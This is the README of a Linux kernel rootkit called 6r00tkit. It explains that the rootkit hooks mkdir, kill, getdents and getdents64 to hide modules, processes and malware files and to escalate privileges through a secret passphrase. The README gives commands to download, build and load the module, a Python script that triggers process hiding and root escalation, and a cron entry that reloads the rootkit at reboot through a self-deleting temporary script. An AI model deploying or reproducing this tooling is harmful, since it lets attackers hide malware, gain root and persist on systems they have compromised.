# 6r00tkit

## Description

6r00tkit (Grootkit) is a rootkit used to hide and protect itself and other rootkits, to hide malware and persistence file for 6r00tkit, to hide process and to set root permissions on a process (privilege escalation).

How it's works:
 - Remove itself and other rootkit from the kernel modules list
 - Use itself and other rootkit to block an unload
 - Hooks 4 syscalls
    - `mkdir`, to get the root permissions for any process you may use the passphrase in `mkdir` syscall (default passphrase is `1 4m 6r00t`)
    - `kill`, to get a hidden process you may use the special signal in `kill` syscall (default is `14600` - numbers in `1 4m 6r00t`)
    - `getdents64` to hide process and files (process directory in `/proc` or customizable malware file and directory)
    - `getdents` to hide process and files (process directory in `/proc` or customizable malware file and directory)

## Requirements

 - Linux system
 - Root permissions to load the module

## Build

```bash
wget https://github.com/mauricelambert/6r00tkit/archive/refs/heads/main.zip
unzip main.zip
cd 6r00tkit-main/
bash compile.sh
```

## Load

### Default parameters

```bash
sudo insmod ./6r00tkit.ko
```

### Add parameters

```bash
sudo insmod ./6r00tkit.ko modulename="other_rootkit" passphrase="s3cr3t" killcode=666 rootkitdirectory="/rootkit/directory" rootkitfile="rootkit.ko" persistencedirectory="/persistence/directory" persistencefile="mycron" malwarefile="my_malware_filename.malware"
```

## Usages

You can use it like the following with python (or use it with any program and script, you only need to call specific syscalls with specific values):

```python
from os import mkdir, getuid, kill, listdir, getpid, system

print("PID:", getpid())
print("\n".join(listdir("/proc/")))
system("ps aux | grep python")
kill(getpid(), 14600) # i use the default signal, you should use your own signal if added as parameters on load
print("\n".join(listdir("/proc/")))
system("ps aux | grep python")

print("Current UID:", getuid())
system("whoami")
mkdir("1 4m 6r00t") # i use the default passphrase, you should use your own passphrase if added as parameters on load
print("Current UID:", getuid())
system("whoami")
```

## Persistence

You can reload the kernel module on reboot with a single cronjob, write the following content in the filename `/etc/cron.d/6r00tkit`:

```cron
@reboot root /bin/bash -c 'echo "/bin/sleep 10; /sbin/insmod /path/to/6r00tkit.ko" > /tmp/.placeholder; /bin/bash /tmp/.placeholder; /bin/rm -f /tmp/.placeholder'
```

## Licence

Licensed under the [GPL, version 3](https://www.gnu.org/licenses/).